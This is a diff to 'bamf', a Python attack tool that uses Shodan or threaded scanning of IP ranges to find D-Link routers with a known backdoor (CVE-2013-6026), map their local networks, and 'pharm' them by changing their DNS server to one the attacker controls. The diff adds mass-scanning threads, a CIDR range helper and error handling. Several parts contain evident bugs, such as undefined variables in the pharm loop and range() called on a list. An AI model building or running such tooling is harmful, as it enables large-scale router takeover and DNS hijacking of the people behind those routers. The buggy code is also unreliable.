@@ -9,6 +9,8 @@ __github__ = 'https://github.com/malwaredllc/bamf'
 # standard library
 import os
 import sys
+import Queue
+import struct
 import socket
 import pprint
 import getopt
@@ -18,6 +20,7 @@ import sqlite3
 import urllib2
 import argparse
 import tempfile
+import threading
 
 # packages
 import shodan
@@ -146,7 +149,7 @@ COMMIT;
         "tools_admin.xgi"
         ]
 
-    __vulnerability = 'CVE-2013-6027'
+    __vulnerability = 'CVE-2013-6026'
 
     def __init__(self, shodan_api=None):
         """
@@ -157,11 +160,14 @@ COMMIT;
 
         """
         mechanize.Browser.__init__(self)
-        self._targets = {}
         self._models = {}
-        self._backdoors = []
+        self._targets = {}
         self._devices = []
+        self._threads = []
+        self._backdoors = []
+        self._queue = Queue.Queue()
         self._query = 'alphanetworks/2.23'
+        self._ports = [8000, 8080, 8888]
         self._database = sqlite3.connect('database.db')
         self._database.executescript(self.__tbl_config)
         self._database.executescript(self.__tbl_routers)
@@ -196,6 +202,16 @@ COMMIT;
             return shodan.Shodan(shodan_api)
         except Exception as e:
             debug("Shodan initialization error: {}".format(str(e)))
+
+    def _threader(self):
+        while True:
+            try:
+                method, args = self._queue.get()
+                if callable(method):
+                    debug(args)
+                    worker = method(*args)
+            except:
+                break
 
     def _save(self):
         for device in self._devices:
@@ -262,10 +278,11 @@ COMMIT;
                         print("  |      Model: " + colorama.Style.DIM + model + colorama.Style.NORMAL)
                         print("  |      Vulnerability: " + colorama.Style.DIM + self.__vulnerability + colorama.Style.NORMAL)
                         print("  |      Signature: " + colorama.Style.DIM + signature + colorama.Style.NORMAL)
-
             else:
                 return
 
+        except KeyboardInterrupt:
+            return
         except Exception as e:
             debug(str(e))
 
@@ -277,20 +294,26 @@ COMMIT;
         :param str dns:     IP address of a user-controlled DNS server
 
         """
-        if not len(self._backdoors):
-            error("no backdoored routers to pharm (use 'scan' to detect vulnerable targets)")
-        elif not valid_ip(dns):
-            error("invalid IP address entered for DNS server")
-        else:
-            for i, router in enumerate(self._backdoors):
+        try:
+            if not len(self._backdoors):
+                error("no backdoored routers to pharm (use 'scan' to detect vulnerable targets)")
+            elif not valid_ip(dns):
+                error("invalid IP address entered for DNS server")
+            else:
+                for i, router in enumerate(self._backdoors):
 
-                self._pharm(router['ip'], router['port'], dns)
+                    self._pharm(router['ip'], router['port'], dns)
 
-                devices = self._database.execute("SELECT (SELECT count() from tbl_devices WHERE router=:router) as count", {"router": ip}).fetchall()[0][0]
+                    devices = self._database.execute("SELECT (SELECT count() from tbl_devices WHERE router=:router) as count", {"router": ip}).fetchall()[0][0]
 
-                print(colorama.Fore.MAGENTA + colorama.Style.NORMAL + '[+]' + colorama.Fore.RESET + ' Router {}:{} - DNS Server Modified'.format(ip, port))
-                print('  |   DNS Server:   ' + colorama.Style.DIM + '{}:53'.format(dns) + colorama.Style.NORMAL)
-                print('  |   Connected Devices: ' + colorama.Style.DIM + '{}\n'.format(size) + colorama.Style.NORMAL)
+                    print(colorama.Fore.MAGENTA + colorama.Style.NORMAL + '[+]' + colorama.Fore.RESET + ' Router {}:{} - DNS Server Modified'.format(ip, port))
+                    print('  |   DNS Server:   ' + colorama.Style.DIM + '{}:53'.format(dns) + colorama.Style.NORMAL)
+                    print('  |   Connected Devices: ' + colorama.Style.DIM + '{}\n'.format(size) + colorama.Style.NORMAL)
+
+        except KeyboardInterrupt:
+            return
+        except Exception as e:
+            debug(str(e))
 
     def scan(self, *args):
         """
@@ -301,28 +324,34 @@ COMMIT;
         :param int port:    Port number of router administration panel
 
         """
-        print("\nScanning {} targets...".format(len(self._targets)))
-        startlen = len(self._backdoors)
+        try:
+            print("\nScanning {} targets...".format(len(self._targets)))
+            startlen = len(self._backdoors)
 
-        if len(args):
-            ip, _, port = args[0].partition(' ')
+            if len(args):
+                ip, _, port = args[0].partition(' ')
 
-            if valid_ip(ip) and port.isdigit(port):
-                self._targets[ip] = int(port)
-                self._scan(ip, port)
-                print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + "1" + colorama.Style.NORMAL + " backdoor(s) found\n")
-            else:
-                error("invalid IP address or port number")
-        else:
-            if len(self._targets):
-                for ip, port in self._targets.items():
+                if valid_ip(ip) and port.isdigit(port):
+                    self._targets[ip] = int(port)
                     self._scan(ip, port)
-                print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + str(len(self._backdoors) - startlen) + colorama.Style.NORMAL + " backdoor(s) found\n")
+                    print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + "1" + colorama.Style.NORMAL + " backdoor(s) found\n")
+                else:
+                    error("invalid IP address or port number")
             else:
-                error("no targets to scan")
-                self.help()
+                if len(self._targets):
+                    for ip, port in self._targets.items():
+                        self._scan(ip, port)
+                    print(colorama.Fore.CYAN + "\n[+]" + colorama.Fore.RESET + " Scan complete - " + colorama.Style.BRIGHT + str(len(self._backdoors) - startlen) + colorama.Style.NORMAL + " backdoor(s) found\n")
+                else:
+                    error("no targets to scan")
+                    self.help()
 
-        self._save()
+            self._save()
+
+        except KeyboardInterrupt:
+            return
+        except Exception as e:
+            debug(str(e))
 
     def map(self, *args):
         """
@@ -333,58 +362,109 @@ COMMIT;
         :param int port:    Port number of router administration panel
 
         """
-        if not len(self._backdoors):
-            error('no backdoored routers with local networks to map')
+        try:
+            if not len(self._backdoors):
+                error('no backdoored routers with local networks to map')
 
-        if len(args):
-            ip, _, port = args[0].partition(' ')
-            if not valid_ip(ip):
-                error("invalid IP address")
-            elif not port.isdigit() or not (0 < int(port) < 65356):
-                error("invalid port number")
+            if len(args):
+                ip, _, port = args[0].partition(' ')
+                if not valid_ip(ip):
+                    error("invalid IP address")
+                elif not port.isdigit() or not (0 < int(port) < 65356):
+                    error("invalid port number")
+                else:
+                    self._map(ip, int(port))
+                    self._save()
             else:
-                self._map(ip, int(port))
+                for backdoor in self._backdoors:
+                    print('\nMapping Network {}...\n'.format(self._backdoors.index(backdoor) + 1))
+                    self._map(backdoor['ip'], backdoor['port'])
                 self._save()
-        else:
-            for backdoor in self._backdoors:
-                print('\nMapping Network {}...\n'.format(self._backdoors.index(backdoor) + 1))
-                self._map(backdoor['ip'], backdoor['port'])
-            self._save()
 
-    def search(self, *args):
+        except KeyboardInterrupt:
+            return
+        except Exception as e:
+            debug(str(e))
+
+    def search(self, ip_range=None):
         """
         Utilize the IoT search-engine, Shodan, to search for vulnerable routers
 
+        `Optional`
+        :param str ip_range:    target IP range in CIDR notation (ex. 192.168.1.1/24)
+
         """
-        if len(args):
-            self._query = str(args[0])
+        try:
+            if isinstance(self._shodan, shodan.Shodan):
 
-        if isinstance(self._shodan, shodan.Shodan):
+                if isinstance(ip_range, str):
 
-            print('\nSearching Shodan for vulnerable routers...')
+                    print('\nTarget IP range: {}'.format(ip_range))
+                    print('\nSearching Shodan for vulnerable routers...')
 
-            n = self._shodan.count(self._query)['total']
+                    subnet = cidr_to_ip_range(ip_range)
+                    previous = len(self._targets)
 
-            print('\nShodan found {} potential target hosts'.format(n))
+                    for ip in subnet:
+                        try:
+                            host = self._shodan.host(ip)
+                            if self._query in host['data']:
+                                for port in self._ports:
+                                    if port in host['ports']:
+                                        self._targets[ip] = port
+                        except Exception as e:
+                            debug(str(e))
 
-            cmd = prompt('Add hosts to targets','y','n','#')
+                    current = len(self._targets)
+                    print('\nAdded {} hosts to targets',)
 
-            if cmd.startswith('n'):
-                return
+                else:
+
+                    print('\nSearching Shodan for vulnerable routers...')
+
+                    for i, item in enumerate(self._shodan.search_cursor(self._query)):
+
+                        ip = item.get('ip_str').encode()
+                        port = item.get('port')
+                        self._targets[ip] = port
+
+                    print("\nAdded {} new targets\n".format(i + 1))
+
             else:
-                for i, item in enumerate(self._shodan.search_cursor(self._query)):
+                    print('\nTarget IP range: {}'.format(ip_range))
+                    print('\nSearching internet for vulnerable routers...')
 
-                    ip = item.get('ip_str').encode()
-                    port = item.get('port')
-                    self._targets[ip] = port
+                    if isinstance(ip_range, str):
 
-                    if cmd.isdigit() and i + 1 == int(cmd):
-                        break
+                        subnet = cidr_to_ip_range(ip_range)
+                        previous = len(self._targets)
 
-                print("\nAdded {} new targets\n".format(i + 1))
+                        for ip in subnet:
+                            for port in self._ports:
+                                method = self._scan
+                                target = (ip, port)
+                                task = (method, target)
+                                self._queue.put(task)
 
-        else:
-            error("search requires Shodan API key")
+                        self._threads = [threading.Thread(target=self._threader) for _ in range(subnet)]
+
+                        for t in self._threads:
+                            t.start()
+
+                        for t in self._threads:
+                            t.join()
+
+                        current = len(self._targets)
+
+                        print('\nAdded {} new targets\n'.format(current))
+
+                    else:
+                        error('invalid IP address/range')
+
+        except KeyboardInterrupt:
+            return
+        except Exception as e:
+            debug(str(e))
 
     def help(self, *args):
         """
@@ -393,8 +473,8 @@ COMMIT;
         """
         print('\n' + colorama.Fore.YELLOW + colorama.Style.BRIGHT + '   COMMAND             DESCRIPTION' + colorama.Fore.RESET + colorama.Style.NORMAL)
         print('   search           ' + colorama.Style.DIM + '   query the Shodan IoT search engine for targets' + colorama.Style.NORMAL)
-        print('   scan [ip] [port] ' + colorama.Style.DIM + '   scan target host(s) for backdoors' + colorama.Style.NORMAL)
-        print('   map [ip] [port]  ' + colorama.Style.DIM + '   map local network(s) of vulnerable routers' + colorama.Style.NORMAL)
+        print('   scan [ip]        ' + colorama.Style.DIM + '   scan target host(s) for backdoors' + colorama.Style.NORMAL)
+        print('   map [ip]         ' + colorama.Style.DIM + '   map local network(s) of vulnerable routers' + colorama.Style.NORMAL)
         print('   pharm <dns>      ' + colorama.Style.DIM + '   modify the dns server of vulnerable routers' + colorama.Style.NORMAL)
         print('   targets          ' + colorama.Style.DIM + '   show current targets' + colorama.Style.NORMAL)
         print('   backdoors        ' + colorama.Style.DIM + '   show backdoors detected this sessions' + colorama.Style.NORMAL)
@@ -485,6 +565,17 @@ def valid_ip(address):
         return False
     return address.count('.') == 3
 
+def cidr_to_ip_range(cidr):
+    ip, _, cidr = str(cidr).partition('/')
+    if not (valid_ip(ip) and cidr.isdigit() and int(cidr) <= 32):
+        error("invalid IP range - use CIDR notation (ex. 192.168.1.1/24)")
+    cidr = int(cidr) 
+    host_bits = 32 - cidr
+    i = struct.unpack('>I', socket.inet_aton(ip))[0]
+    start = (i >> host_bits) << host_bits
+    end = start | ((1 << host_bits) - 1) 
+    return [ socket.inet_ntoa(struct.pack('>I',i)) for i in range(start, end) ]
+
 # main
 def main():
     bamf = Bamf(shodan_api=options.shodan)
@@ -494,7 +585,7 @@ def main():
 if __name__ == '__main__':
 
     print(colorama.Fore.RED + LOGO + colorama.Fore.RESET)
-    
+
     parser = argparse.ArgumentParser(
         prog='bamf.py', 
         version='0.1.2', 
